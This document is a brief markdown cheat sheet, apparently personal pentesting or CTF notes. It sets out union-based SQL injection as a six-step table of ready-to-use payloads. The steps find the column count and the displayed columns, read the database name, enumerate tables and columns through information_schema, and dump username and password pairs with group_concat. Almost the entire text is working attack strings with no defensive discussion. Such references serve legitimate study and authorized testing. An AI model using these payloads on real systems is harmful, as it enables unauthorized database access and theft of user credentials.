#union_sql_injection

| Step | Description                          | Realisation                                                                                                       |
| ---- | ------------------------------------ | ----------------------------------------------------------------------------------------------------------------- |
| 1    | Determine the number of columns      | `1 UNION SELECT 1`<br>`1 UNION SELECT 1,2`...                                                                     |
| 2    | Identify which columns are displayed | `0 UNION SELECT 1,2,3`                                                                                            |
| 3    | Extract the database name            | `0 UNION SELECT 1,2,database()`                                                                                   |
| 4    | Enumerate tables                     | `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'database_name'` |
| 5    | Enumerate columns                    | `0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'target_table'`  |
| 6    | Extract data                         | `0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM target_table`                       |
